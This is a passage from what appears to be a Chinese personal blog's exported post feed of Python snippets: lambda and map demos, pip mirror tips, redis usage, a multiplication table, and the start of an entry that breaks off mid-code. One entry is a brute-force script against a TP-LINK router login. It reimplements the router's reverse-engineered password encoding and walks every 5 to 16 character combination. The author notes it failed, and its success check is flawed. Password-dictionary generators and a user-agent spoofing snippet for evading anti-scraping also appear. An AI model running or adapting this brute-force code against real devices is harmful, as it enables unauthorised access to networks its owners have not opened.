class="built_in">map</span>(app,[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>],[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;map两个参数：&quot;</span>+<span class="built_in">str</span>(<span class="built_in">list</span>(oo)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匿名函数 map 最low用法</span></span><br><span class="line">pp = <span class="keyword">lambda</span> x:x**<span class="number">2</span></span><br><span class="line">po = <span class="built_in">map</span>(pp,[<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匿名函数lambda，map一个参数：&quot;</span>+<span class="built_in">str</span>(<span class="built_in">list</span>(po)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匿名函数 map 最靓用法</span></span><br><span class="line">ox = <span class="built_in">map</span>(<span class="keyword">lambda</span> x:x**<span class="number">3</span> ,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匿名函数 map 最靓用法: &quot;</span>+<span class="built_in">str</span>(<span class="built_in">list</span>(ox)))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>pip 一次性安装多个库</title>
    <url>//pip</url>
    <content><![CDATA[<h1 id="pip-一次性安装多个库"><a href="#pip-一次性安装多个库" class="headerlink" title="pip 一次性安装多个库"></a>pip 一次性安装多个库</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pip一次性安装很多库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1、问题描述：有时候我们想要安装许多python库来进行work，但一条条安装过于麻烦，所以想一次性安装所需的所有库。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2、问题解决：首先将自己所需的库放在一个requirement.txt文件中，然后通过参数-r来安装文件里所列出的所有库。示例如下：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pip install -r requirement.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1、 如果安装的比较慢，可以换安装源，需要参数-i，示例如下：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pip install -i https://pypi.douban.com/simple -r requirement.txt</span></span><br><span class="line"><span class="string">        or</span></span><br><span class="line"><span class="string">    pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -r requirement.txt</span></span><br><span class="line"><span class="string">        or</span></span><br><span class="line"><span class="string">    pip install -i https://mirrors.aliyun.com/pypi/simple -r requirement.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="pip-离线安装本地库-模块"><a href="#pip-离线安装本地库-模块" class="headerlink" title="pip 离线安装本地库/模块"></a>pip 离线安装本地库/模块</h1><p>1、cd到当前目录下 </p>
<p>2、复制模块/库 压缩包到当前目录</p>
<p>3、用命令安装：pip install ./fake-useragent-0.1.11.tar.gz</p>
]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>pip 换源</title>
    <url>//pip-%E6%8D%A2%E6%BA%90</url>
    <content><![CDATA[<h1 id="pip-换源"><a href="#pip-换源" class="headerlink" title="pip  换源"></a>pip  换源</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">阿里云             http://mirrors.aliyun.com/pypi/simple</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">中国科技大学        https://pypi.mirrors.ustc.edu.cn/simple</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">豆瓣(douban)       http://pypi.douban.com/simple</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">清华大学           https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">中国科学技术大学     http://pypi.mirrors.ustc.edu.cn/simple</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">华中理工大学        http://pypi.hustunique.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">山东理工大学        http://pypi.sdutlinux.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1、使用时直接 -i 加 url 即可！如下安装：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pip install jupyter -i https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2、但是可能会出现问题：  解决方法就是在后面加上一段：  # or https:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pip install jieba -i http://pypi.tuna.tsinghua.edu.cn/simple --trusted-host pypi.tuna.tsinghua.edu.cn</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>redis-操作</title>
    <url>//redis-%E6%93%8D%E4%BD%9C</url>
    <content><![CDATA[<h1 id="redis-操作"><a href="#redis-操作" class="headerlink" title="redis-操作"></a>redis-操作</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">redis 操作</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = redis.Redis(host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">6379</span>, decode_responses=<span class="literal">True</span>)</span><br><span class="line">r.<span class="built_in">set</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;root&#x27;</span>)  <span class="comment"># 设置 name 对应的值</span></span><br><span class="line">r.lpush(<span class="string">&#x27;na&#x27;</span>,<span class="number">12</span>,<span class="string">&#x27;love&#x27;</span>,<span class="string">&#x27;heihei&#x27;</span>,<span class="string">&#x27;xixi&#x27;</span>,<span class="string">&#x27;haha&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(r.get(<span class="string">&#x27;na&#x27;</span>))  <span class="comment"># 取出键 name 对应的值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(r.get(<span class="string">&#x27;name&#x27;</span>)))  <span class="comment"># 查看类型</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>脚本_tp-link路由器后台_硬解</title>
    <url>//%E8%84%9A%E6%9C%AC</url>
    <content><![CDATA[<h1 id="脚本-tp-link-路由器后台-硬解"><a href="#脚本-tp-link-路由器后台-硬解" class="headerlink" title="脚本_tp-link_路由器后台_硬解"></a>脚本_tp-link_路由器后台_硬解</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">失败....</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问测试</span></span><br><span class="line"><span class="comment"># url = &quot;http://192.168.1.1/&quot;</span></span><br><span class="line"><span class="comment"># r = requests.get(url)</span></span><br><span class="line"><span class="comment"># print(&quot;状态码：&quot;,r)</span></span><br><span class="line"><span class="comment"># print(&quot;网页内容：&quot;,r.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器 计算时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_out</span>(<span class="params">a_func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clocked</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        result = a_func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序：&quot;</span> + a_func.__name__,<span class="string">&quot;    运行时间：&quot;</span> + <span class="built_in">str</span>(end - start))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> clocked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># js逆向 得到路由器密码加密方式</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">security_encode</span>(<span class="params">b</span>):</span></span><br><span class="line">    a = <span class="string">&#x27;RDpbLfCPsJZ7fiv&#x27;</span></span><br><span class="line">    c = <span class="string">&#x27;yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW&#x27;</span></span><br><span class="line"></span><br><span class="line">    e = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    g = <span class="built_in">len</span>(a)</span><br><span class="line">    h = <span class="built_in">len</span>(b)</span><br><span class="line">    k = <span class="built_in">len</span>(c)</span><br><span class="line"></span><br><span class="line">    f = g <span class="keyword">if</span> g &gt; h <span class="keyword">else</span> h</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(f):</span><br><span class="line">        n = l = <span class="number">187</span></span><br><span class="line">        <span class="keyword">if</span> p &gt;= g:</span><br><span class="line">            n = <span class="built_in">ord</span>(b[p])</span><br><span class="line">        <span class="keyword">elif</span> p &gt;= h:</span><br><span class="line">            l = <span class="built_in">ord</span>(a[p])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = <span class="built_in">ord</span>(a[p])</span><br><span class="line">            n = <span class="built_in">ord</span>(b[p])</span><br><span class="line">        e += c[((l ^ n) % k)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用加密后的密码开始登陆路由器后台</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">password</span>):</span></span><br><span class="line">    requests.get(<span class="string">&#x27;http://192.168.1.1&#x27;</span>, headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://192.168.1.1&#x27;</span>, json=&#123;<span class="string">&quot;method&quot;</span>: <span class="string">&quot;do&quot;</span>, <span class="string">&quot;login&quot;</span>: &#123;<span class="string">&quot;password&quot;</span>: security_encode(password)&#125;&#125;)</span><br><span class="line"></span><br><span class="line">    code = r.status_code</span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;状态码：&#x27;</span>,code,<span class="string">&quot;密码正确，登陆成功！！！！！！！&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;状态码：&#x27;</span>, code, <span class="string">&quot;密码错误，继续尝试登陆.......&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"><span class="comment"># 密码字典  生成密码</span></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_z_Z_symbol</span>(<span class="params">a=<span class="number">5</span>,count=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    我认为的所有密码：</span></span><br><span class="line"><span class="string">    数字 + 小写字母 + 大写字母 + 符号</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*?_-.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">17</span>):  <span class="comment"># 密码长度  从5位数开始  16位数密码结束</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=i):</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;*************** 第 &#x27;</span> + <span class="built_in">str</span>(count) + <span class="string">&#x27; 组密码 ***************&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            e = security_encode(password)</span><br><span class="line">            <span class="keyword">if</span> login(e) == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;密码破解成功，程序退出！&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始硬解</span></span><br><span class="line">    num_z_Z_symbol()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>user-agent反反爬</title>
    <url>//user-agent%E5%8F%8D%E5%8F%8D%E7%88%AC</url>
    <content><![CDATA[<h1 id="user-agent反反爬"><a href="#user-agent反反爬" class="headerlink" title="user-agent反反爬"></a>user-agent反反爬</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> fake_useragent</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化 user-agent 对象</span></span><br><span class="line">ua = fake_useragent.UserAgent()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(ua.random)  <span class="comment"># Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36</span></span><br><span class="line"><span class="comment"># print(ua.random)  # Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)</span></span><br><span class="line"><span class="comment"># print(ua.random)  # Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>九九乘法表</title>
    <url>//%E4%B9%9D%E4%B9%9D%E4%B9%98%E6%B3%95%E8%A1%A8</url>
    <content><![CDATA[<h1 id="九九乘法表"><a href="#九九乘法表" class="headerlink" title="九九乘法表"></a>九九乘法表</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    九九乘法表------简单又容易忘......</span></span><br><span class="line"><span class="string">        重点： end=&quot;&quot;</span></span><br><span class="line"><span class="string">        print(str(j)+&quot; * &quot;+str(i)+&quot; = &quot;+str(i*j)+&quot;\t&quot;,end=&quot;&quot;)</span></span><br><span class="line"><span class="string">    print(&quot; &quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">        j = j+<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(j)+<span class="string">&quot; * &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot; = &quot;</span>+<span class="built_in">str</span>(i*j)+<span class="string">&quot;\t&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>匿名函数-lambda</title>
    <url>//%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0-lambda</url>
    <content><![CDATA[<h1 id="匿名函数-lambda"><a href="#匿名函数-lambda" class="headerlink" title="匿名函数-lambda"></a>匿名函数-lambda</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    注意：</span></span><br><span class="line"><span class="string">        调用匿名函数句柄时  要加括号（）</span></span><br><span class="line"><span class="string">        无参数匿名函数调用时   要加括号（）</span></span><br><span class="line"><span class="string">    复习：</span></span><br><span class="line"><span class="string">        random函数   random.random()  会返回0-1之间的随机小数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正常函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b=<span class="number">1</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正常函数：&quot;</span>+<span class="built_in">str</span>(add(<span class="number">5</span>,<span class="number">5</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正常函数：&quot;</span>+<span class="built_in">str</span>(add(<span class="number">5</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匿名函数lambda 赋值运算</span></span><br><span class="line">app = <span class="keyword">lambda</span> x,y=<span class="number">20</span>:x+y</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匿名函数：&quot;</span>+<span class="built_in">str</span>(app(<span class="number">5</span>,<span class="number">6</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匿名函数：&quot;</span>+<span class="built_in">str</span>(app(<span class="number">8</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匿名函数lambda判断运算</span></span><br><span class="line">get_odd_even = <span class="keyword">lambda</span> x,y:<span class="string">&quot;even&quot;</span> <span class="keyword">if</span> x % <span class="number">2</span> ==<span class="number">0</span> <span class="keyword">and</span> y % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&quot;odd&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匿名函数判断：&quot;</span>+get_odd_even(<span class="number">16</span>,<span class="number">28</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匿名函数判断：&quot;</span>+get_odd_even(<span class="number">17</span>,<span class="number">28</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无参数的匿名函数</span></span><br><span class="line">num = <span class="keyword">lambda</span>:random.random()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(num()))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(num()))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(num()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>密码字典-1</title>
    <url>//%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8-1</url>
    <content><![CDATA[<h1 id="密码字典-1"><a href="#密码字典-1" class="headerlink" title="密码字典_1"></a>密码字典_1</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-47:空格 ! &quot; # $ % &amp; &#x27; ( ) * + , - . /</span></span><br><span class="line"><span class="comment"># 48-57:0-9</span></span><br><span class="line"><span class="comment"># 58-64:: ; &lt; = &gt; ? @</span></span><br><span class="line"><span class="comment"># 65-90:A-Z</span></span><br><span class="line"><span class="comment"># 91-96:[ 反斜杠 ] ^ _ `</span></span><br><span class="line"><span class="comment"># 97-122:a-z</span></span><br><span class="line"><span class="comment"># 123-126:&#123; | &#125; ~</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> scipy.special <span class="keyword">import</span> comb, perm</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这个方法比较方便快捷，但是比较消耗内存，内存不大，会内存溢出</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">products</span>(<span class="params">length=<span class="number">5</span></span>):</span></span><br><span class="line">    chars = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>)])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(chars, repeat=length):</span><br><span class="line">        string = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        <span class="built_in">print</span>(string)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这个方法运行速度快，但是容易遗漏</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_str</span>(<span class="params">code_len=<span class="number">5</span></span>):</span></span><br><span class="line">    chars = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>)])</span><br><span class="line">    code_count = <span class="built_in">int</span>(comb(<span class="built_in">len</span>(chars), code_len))</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; code_count:</span><br><span class="line">        checkcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(code_len):</span><br><span class="line">            j = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(chars) - <span class="number">1</span>)</span><br><span class="line">            checkcode += chars[j]</span><br><span class="line">        <span class="built_in">print</span>(checkcode)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这个方法综合前两种，内存消耗不大，运行速度一般</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_list</span>(<span class="params">length=<span class="number">5</span></span>):</span></span><br><span class="line">    chars = [<span class="built_in">chr</span>(j) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> &lt;&lt; <span class="built_in">len</span>(chars)):</span><br><span class="line">        combo_list = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chars)):</span><br><span class="line">            <span class="keyword">if</span> i &amp; (<span class="number">1</span> &lt;&lt; j):</span><br><span class="line">                combo_list.append(chars[j])</span><br><span class="line">        sub_list_len = <span class="built_in">len</span>(combo_list)</span><br><span class="line">        <span class="keyword">if</span> sub_list_len != length:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sub_str = <span class="string">&#x27;&#x27;</span>.join(combo_list)</span><br><span class="line">            <span class="built_in">print</span>(sub_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    products()</span><br><span class="line">    random_str()</span><br><span class="line">    sub_list()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    products()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>密码字典-2</title>
    <url>//%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8-2</url>
    <content><![CDATA[<h1 id="密码字典-2"><a href="#密码字典-2" class="headerlink" title="密码字典_2"></a>密码字典_2</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器 计算时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_out</span>(<span class="params">a_func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clocked</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        result = a_func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序：&quot;</span> + a_func.__name__,<span class="string">&quot;    运行时间：&quot;</span> + <span class="built_in">str</span>(end - start))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> clocked</span><br><span class="line"></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num</span>(<span class="params">a=<span class="number">5</span>, count=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    纯数字</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=a):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">        <span class="comment"># print(&#x27;*************** 第 &#x27; + str(count) + &#x27; 组密码 ***************&#x27;)</span></span><br><span class="line">        <span class="comment"># print(password)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;长度为&quot;</span> + <span class="built_in">str</span>(a) + <span class="string">&quot;位的   “&quot;</span> + <span class="string">&quot;数字&quot;</span> + <span class="string">&quot;”  组成密码，一共 &quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; 组！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Lower_case_letters</span>(<span class="params">a=<span class="number">5</span>,count=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    纯小写字母</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=a):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">        <span class="comment"># print(&#x27;*************** 第 &#x27; + str(count) + &#x27; 组密码 ***************&#x27;)</span></span><br><span class="line">        <span class="comment"># print(password)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;长度为&quot;</span> + <span 